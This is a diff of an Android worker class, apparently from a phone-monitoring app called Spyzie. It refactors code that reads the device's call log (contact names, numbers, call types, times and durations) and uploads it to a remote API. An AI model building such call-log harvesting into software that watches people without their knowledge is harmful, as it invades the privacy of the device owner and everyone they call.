@@ -35,11 +35,17 @@ public class GetCallsWorker extends Worker {
     public Result doWork() {
         SpyzieApplication.getInstance().getServiceComponent().inject(this);
 
-        if (!CommonUtils.hasCallPermission(getApplicationContext())) {
+        if (CommonUtils.hasCallPermission(getApplicationContext())) {
+            mApiManager.sendCallsData(getCallLog());
+            return Result.success();
+        } else {
             mApiManager.sendExceptionTracking(Error.HAS_NO_CALL_LOG_PERMISSION);
             return Result.failure();
         }
+    }
 
+    private List<Call> getCallLog() {
+        List<Call> calls = new ArrayList<>();
         String[] projection = new String[] {
                 CallLog.Calls._ID,
                 CallLog.Calls.CACHED_NAME,
@@ -52,7 +58,6 @@ public class GetCallsWorker extends Worker {
         String name, number;
         int type;
         long id, time, duration;
-        List<Call> calls = new ArrayList<>();
         while (cursor.moveToNext()) {
             id = cursor.getLong(0);
             name = cursor.getString(1);
@@ -63,7 +68,6 @@ public class GetCallsWorker extends Worker {
             calls.add(new Call(id, name, number, type, time, duration));
         }
         cursor.close();
-        mApiManager.sendCallsData(calls);
-        return Result.success();
+        return calls;
     }
 }
